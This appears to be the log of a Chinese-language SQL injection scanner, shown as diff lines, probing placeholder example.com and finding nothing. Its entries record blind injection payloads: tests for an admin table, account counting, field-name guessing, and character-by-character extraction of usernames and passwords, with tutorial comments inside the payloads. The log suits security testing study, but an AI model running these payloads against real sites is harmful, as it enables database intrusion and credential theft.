+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+    ✔️ 无明显漏洞（参数：id，Payload：-- 4.猜解字符，耗时：2.71s）
+  → 测试 URL：https://example.com/?id=and+1%3D%28select+count%28%2A%29+from+admin+where+left%28name%2C1%29%3Da%29+---%E7%8C%9C%E8%A7%A3%E7%94%A8%E6%88%B7%E5%B8%90%E5%8F%B7%E7%9A%84%E7%AC%AC%E4%B8%80%E4%BD%8D&name=test
+    ↳ 响应状态码：200
+    ↳ 响应头：{'Accept-Ranges': 'bytes', 'Content-Type': 'text/html', 'ETag': '"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"', 'Last-Modified': 'Mon, 13 Jan 2025 20:11:20 GMT', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Cache-Control': 'max-age=3255', 'Date': 'Tue, 26 Aug 2025 14:48:55 GMT', 'Alt-Svc': 'h3=":443"; ma=93600,h3-29=":443"; ma=93600', 'Content-Length': '648', 'Connection': 'keep-alive'}
+    ↳ 响应体（完整内容）：<!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+    ✔️ 无明显漏洞（参数：id，Payload：and 1=(select count(*) from admin where left(name,1)=a) ---猜解用户帐号的第一位，耗时：3.46s）
+  → 测试 URL：https://example.com/?id=and+1%3D%28select+count%28%2A%29+from+admin+where+left%28name%2C2%29%3Dab%29---%E7%8C%9C%E8%A7%A3%E7%94%A8%E6%88%B7%E5%B8%90%E5%8F%B7%E7%9A%84%E7%AC%AC%E4%BA%8C%E4%BD%8D&name=test
+    ↳ 响应状态码：200
+    ↳ 响应头：{'Accept-Ranges': 'bytes', 'Content-Type': 'text/html', 'ETag': '"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"', 'Last-Modified': 'Mon, 13 Jan 2025 20:11:20 GMT', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Cache-Control': 'max-age=3252', 'Date': 'Tue, 26 Aug 2025 14:48:58 GMT', 'Alt-Svc': 'h3=":443"; ma=93600,h3-29=":443"; ma=93600', 'Content-Length': '648', 'Connection': 'keep-alive'}
+    ↳ 响应体（完整内容）：<!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+    ✔️ 无明显漏洞（参数：id，Payload：and 1=(select count(*) from admin where left(name,2)=ab)---猜解用户帐号的第二位，耗时：1.09s）
+  → 测试 URL：https://example.com/?id=--+%E5%B0%B1%E8%BF%99%E6%A0%B7%E4%B8%80%E6%AC%A1%E5%8A%A0%E4%B8%80%E4%B8%AA%E5%AD%97%E7%AC%A6%E8%BF%99%E6%A0%B7%E7%8C%9C%2C%E7%8C%9C%E5%88%B0%E5%A4%9F%E4%BD%A0%E5%88%9A%E6%89%8D%E7%8C%9C%E5%87%BA%E6%9D%A5%E7%9A%84%E5%A4%9A%E5%B0%91%E4%BD%8D%E4%BA%86%E5%B0%B1%E5%AF%B9%E4%BA%86%2C%E5%B8%90%E5%8F%B7%E5%B0%B1%E7%AE%97%E5%87%BA%E6%9D%A5%E4%BA%86&name=test
+    ↳ 响应状态码：200
+    ↳ 响应头：{'Accept-Ranges': 'bytes', 'Content-Type': 'text/html', 'ETag': '"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"', 'Last-Modified': 'Mon, 13 Jan 2025 20:11:20 GMT', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Cache-Control': 'max-age=3249', 'Date': 'Tue, 26 Aug 2025 14:49:01 GMT', 'Alt-Svc': 'h3=":443"; ma=93600,h3-29=":443"; ma=93600', 'Content-Length': '648', 'Connection': 'keep-alive'}
+    ↳ 响应体（完整内容）：<!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+    ✔️ 无明显漏洞（参数：id，Payload：-- 就这样一次加一个字符这样猜,猜到够你刚才猜出来的多少位了就对了,帐号就算出来了，耗时：3.28s）
+  → 测试 URL：https://example.com/?id=and+1%3D%28select+top+1+count%28%2A%29+from+Admin+where+Asc%28mid%28pass%2C5%2C1%29%29%3D51%29+--%E8%BF%99%E4%B8%AA%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5%E5%8F%AF%E4%BB%A5%E7%8C%9C%E8%A7%A3%E4%B8%AD%E6%96%87%E7%9A%84%E7%94%A8%E6%88%B7%E5%92%8C_blank%3E%E5%AF%86%E7%A0%81.%E5%8F%AA%E8%A6%81%E6%8A%8A%E5%90%8E%E9%9D%A2%E7%9A%84%E6%95%B0%E5%AD%97%E6%8D%A2%E6%88%90%E4%B8%AD%E6%96%87%E7%9A%84ASSIC%E7%A0%81%E5%B0%B1OK.%E6%9C%80%E5%90%8E%E6%8A%8A%E7%BB%93%E6%9E%9C%E5%86%8D%E8%BD%AC%E6%8D%A2%E6%88%90%E5%AD%97%E7%AC%A6.&name=test
+    ↳ 响应状态码：200
+    ↳ 响应头：{'Accept-Ranges': 'bytes', 'Content-Type': 'text/html', 'ETag': '"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"', 'Last-Modified': 'Mon, 13 Jan 2025 20:11:20 GMT', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Content-Length': '648', 'Cache-Control': 'max-age=3248', 'Date': 'Tue, 26 Aug 2025 14:49:02 GMT', 'Alt-Svc': 'h3=":443"; ma=93600,h3-29=":443"; ma=93600', 'Connection': 'keep-alive'}
+    ↳ 响应体（完整内容）：<!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+    ✔️ 无明显漏洞（参数：id，Payload：and 1=(select top 1 count(*) from Admin where Asc(mid(pass,5,1))=51) --这个查询语句可以猜解中文的用户和_blank>密码.只要把后面的数字换成中文的ASSIC码就OK.最后把结果再转换成字符.，耗时：1.34s）
+
+🔍 开始测试参数：name
+  → 测试 URL：https://example.com/?id=1&name=%3B+and+1%3D1+and+1%3D2
+    ↳ 响应状态码：200
+    ↳ 响应头：{'Accept-Ranges': 'bytes', 'Content-Type': 'text/html', 'ETag': '"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"', 'Last-Modified': 'Mon, 13 Jan 2025 20:11:20 GMT', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Content-Length': '648', 'Cache-Control': 'max-age=3246', 'Date': 'Tue, 26 Aug 2025 14:49:04 GMT', 'Alt-Svc': 'h3=":443"; ma=93600,h3-29=":443"; ma=93600', 'Connection': 'keep-alive'}
+    ↳ 响应体（完整内容）：<!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+    ✔️ 无明显漏洞（参数：name，Payload：; and 1=1 and 1=2，耗时：0.91s）
+  → 测试 URL：https://example.com/?id=1&name=and+0%3C%3E%28select+count%28%2A%29+from+%2A%29
+    ↳ 响应状态码：200
+    ↳ 响应头：{'Accept-Ranges': 'bytes', 'Content-Type': 'text/html', 'ETag': '"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"', 'Last-Modified': 'Mon, 13 Jan 2025 20:11:20 GMT', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Cache-Control': 'max-age=3245', 'Date': 'Tue, 26 Aug 2025 14:49:05 GMT', 'Alt-Svc': 'h3=":443"; ma=93600,h3-29=":443"; ma=93600', 'Content-Length': '648', 'Connection': 'keep-alive'}
+    ↳ 响应体（完整内容）：<!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+    ✔️ 无明显漏洞（参数：name，Payload：and 0<>(select count(*) from *)，耗时：0.99s）
+  → 测试 URL：https://example.com/?id=1&name=and+0%3C%3E%28select+count%28%2A%29+from+admin%29+--+%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8admin%E8%BF%99%E5%BC%A0%E8%A1%A8
+    ↳ 响应状态码：200
+    ↳ 响应头：{'Accept-Ranges': 'bytes', 'Content-Type': 'text/html', 'ETag': '"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"', 'Last-Modified': 'Mon, 13 Jan 2025 20:11:20 GMT', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Content-Length': '648', 'Cache-Control': 'max-age=3243', 'Date': 'Tue, 26 Aug 2025 14:49:07 GMT', 'Alt-Svc': 'h3=":443"; ma=93600,h3-29=":443"; ma=93600', 'Connection': 'keep-alive'}
+    ↳ 响应体（完整内容）：<!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+    ✔️ 无明显漏洞（参数：name，Payload：and 0<>(select count(*) from admin) -- 判断是否存在admin这张表，耗时：1.95s）
+  → 测试 URL：https://example.com/?id=1&name=--+1.%E7%8C%9C%E5%B8%90%E5%8F%B7%E6%95%B0%E7%9B%AE+%E5%A6%82%E6%9E%9C%E9%81%87%E5%88%B00%3C+%E8%BF%94%E5%9B%9E%E6%AD%A3%E7%A1%AE%E9%A1%B5%E9%9D%A2+1%3C%E8%BF%94%E5%9B%9E%E9%94%99%E8%AF%AF%E9%A1%B5%E9%9D%A2%E8%AF%B4%E6%98%8E%E5%B8%90%E5%8F%B7%E6%95%B0%E7%9B%AE%E5%B0%B1%E6%98%AF1%E4%B8%AA
+    ↳ 响应状态码：200
+    ↳ 响应头：{'Accept-Ranges': 'bytes', 'Content-Type': 'text/html', 'ETag': '"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"', 'Last-Modified': 'Mon, 13 Jan 2025 20:11:20 GMT', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Cache-Control': 'max-age=3243', 'Date': 'Tue, 26 Aug 2025 14:49:07 GMT', 'Alt-Svc': 'h3=":443"; ma=93600,h3-29=":443"; ma=93600', 'Content-Length': '648', 'Connection': 'keep-alive'}
+    ↳ 响应体（完整内容）：<!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+    ✔️ 无明显漏洞（参数：name，Payload：-- 1.猜帐号数目 如果遇到0< 返回正确页面 1<返回错误页面说明帐号数目就是1个，耗时：1.08s）
+  → 测试 URL：https://example.com/?id=1&name=and+0%3C%28select+count%28%2A%29+from+admin%29
+    ↳ 响应状态码：200
+    ↳ 响应头：{'Accept-Ranges': 'bytes', 'Content-Type': 'text/html', 'ETag': '"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"', 'Last-Modified': 'Mon, 13 Jan 2025 20:11:20 GMT', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Cache-Control': 'max-age=3240', 'Date': 'Tue, 26 Aug 2025 14:49:10 GMT', 'Alt-Svc': 'h3=":443"; ma=93600,h3-29=":443"; ma=93600', 'Content-Length': '648', 'Connection': 'keep-alive'}
+    ↳ 响应体（完整内容）：<!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+    ✔️ 无明显漏洞（参数：name，Payload：and 0<(select count(*) from admin)，耗时：3.24s）
+  → 测试 URL：https://example.com/?id=1&name=and+1%3C%28select+count%28%2A%29+from+admin%29
+    ↳ 响应状态码：200
+    ↳ 响应头：{'Accept-Ranges': 'bytes', 'Content-Type': 'text/html', 'ETag': '"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"', 'Last-Modified': 'Mon, 13 Jan 2025 20:11:20 GMT', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Cache-Control': 'max-age=3235', 'Date': 'Tue, 26 Aug 2025 14:49:15 GMT', 'Alt-Svc': 'h3=":443"; ma=93600,h3-29=":443"; ma=93600', 'Content-Length': '648', 'Connection': 'keep-alive'}
+    ↳ 响应体（完整内容）：<!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+    ✔️ 无明显漏洞（参数：name，Payload：and 1<(select count(*) from admin)，耗时：4.82s）
+  → 测试 URL：https://example.com/?id=1&name=--+2.%E7%8C%9C%E8%A7%A3%E5%AD%97%E6%AE%B5%E5%90%8D%E7%A7%B0+%E5%9C%A8len%28+%29+%E6%8B%AC%E5%8F%B7%E9%87%8C%E9%9D%A2%E5%8A%A0%E4%B8%8A%E6%88%91%E4%BB%AC%E6%83%B3%E5%88%B0%E7%9A%84%E5%AD%97%E6%AE%B5%E5%90%8D%E7%A7%B0.
+    ↳ 响应状态码：200
+    ↳ 响应头：{'Accept-Ranges': 'bytes', 'Content-Type': 'text/html', 'ETag': '"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"', 'Last-Modified': 'Mon, 13 Jan 2025 20:11:20 GMT', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Cache-Control': 'max-age=3233', 'Date': 'Tue, 26 Aug 2025 14:49:17 GMT', 'Alt-Svc': 'h3=":443"; ma=93600,h3-29=":443"; ma=93600', 'Content-Length': '648', 'Connection': 'keep-alive'}
+    ↳ 响应体（完整内容）：<!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+    ✔️ 无明显漏洞（参数：name，Payload：-- 2.猜解字段名称 在len( ) 括号里面加上我们想到的字段名称.，耗时：1.57s）
+  → 测试 URL：https://example.com/?id=1&name=and+1%3D%28select+count%28%2A%29+from+admin+where+len%28%2A%29%3E0%29--
+    ↳ 响应状态码：200
+    ↳ 响应头：{'Accept-Ranges': 'bytes', 'Content-Type': 'text/html', 'ETag': '"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"', 'Last-Modified': 'Mon, 13 Jan 2025 20:11:20 GMT', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Cache-Control': 'max-age=3232', 'Date': 'Tue, 26 Aug 2025 14:49:18 GMT', 'Alt-Svc': 'h3=":443"; ma=93600,h3-29=":443"; ma=93600', 'Content-Length': '648', 'Connection': 'keep-alive'}
+    ↳ 响应体（完整内容）：<!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+    ✔️ 无明显漏洞（参数：name，Payload：and 1=(select count(*) from admin where len(*)>0)--，耗时：1.49s）
+  → 测试 URL：https://example.com/?id=1&name=and+1%3D%28select+count%28%2A%29+from+admin+where+len%28%E7%94%A8%E6%88%B7%E5%AD%97%E6%AE%B5%E5%90%8D%E7%A7%B0name%29%3E0%29
+    ↳ 响应状态码：200
+    ↳ 响应头：{'Accept-Ranges': 'bytes', 'Content-Type': 'text/html', 'ETag': '"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"', 'Last-Modified': 'Mon, 13 Jan 2025 20:11:20 GMT', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Cache-Control': 'max-age=3230', 'Date': 'Tue, 26 Aug 2025 14:49:20 GMT', 'Alt-Svc': 'h3=":443"; ma=93600,h3-29=":443"; ma=93600', 'Content-Length': '648', 'Connection': 'keep-alive'}
+    ↳ 响应体（完整内容）：<!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+    ✔️ 无明显漏洞（参数：name，Payload：and 1=(select count(*) from admin where len(用户字段名称name)>0)，耗时：0.87s）
+  → 测试 URL：https://example.com/?id=1&name=and+1%3D%28select+count%28%2A%29+from+admin+where+len%28_blank%3E%E5%AF%86%E7%A0%81%E5%AD%97%E6%AE%B5%E5%90%8D%E7%A7%B0password%29%3E0%29
+    ↳ 响应状态码：200
